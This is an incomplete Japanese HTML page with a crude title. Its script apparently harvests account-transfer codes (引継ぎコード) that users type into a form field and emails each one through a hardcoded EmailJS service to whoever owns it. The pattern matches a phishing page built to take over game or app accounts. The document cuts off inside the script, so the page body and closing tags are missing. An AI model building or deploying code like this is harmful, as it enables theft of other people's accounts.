<!DOCTYPE html>&#10;<html lang="ja">&#10;<head>&#10;&#32;&#32;&#32;&#32;<meta charset="UTF-8">&#10;&#32;&#32;&#32;&#32;<meta name="viewport" content="width=device-width, initial-scale=1.0">&#10;&#32;&#32;&#32;&#32;<title>&#12475;&#12483;&#12463;&#12473;</title>&#10;&#32;&#32;&#32;&#32;<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>&#10;&#32;&#32;&#32;&#32;<script>
        (function(){
            emailjs.init("6thQjNYx0vEGNezCM"); // ユーザーIDを設定
        })();

        function sendMail(event) {
            event.preventDefault(); // フォームのデフォルト送信を防止

            const transferCode = document.getElementById('transfer_code').value; // 引継ぎコードを取得
            console.log("Transfer Code:", transferCode); // 引継ぎコードの値を確認

            emailjs.send("service_2aj58wc", "template_5uspofv", {
                transfer_code: transferCode // テンプレートに渡す変数
            })
            .then((response) => {
                console.log('Success!', response.status, response.text);
                alert('メールが送信されました！');
            }, (error) => {
                console.error('Error sending email:', error); // エラーの詳細をコンソールに出力
                alert('メールの送信に失敗しました。エラーコード: ' + error.status + ' - ' + error.text); // エラーメッセージを表示
            });
        }
